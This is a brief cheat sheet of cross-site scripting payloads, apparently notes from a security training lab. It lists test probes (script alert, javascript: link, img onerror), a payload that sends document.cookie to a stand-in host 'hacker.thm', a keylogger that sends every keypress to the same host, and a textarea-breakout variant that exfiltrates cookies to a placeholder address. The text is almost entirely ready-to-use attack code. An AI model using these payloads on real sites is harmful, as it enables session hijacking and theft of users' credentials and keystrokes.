# test

<script>alert('XSS');</script>

<a href="javascript:alert(1)">CLICK HERE</a>
<Img sRc=x OnError=confirm(1)>

# session steal

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

# key logger

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

# example

</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
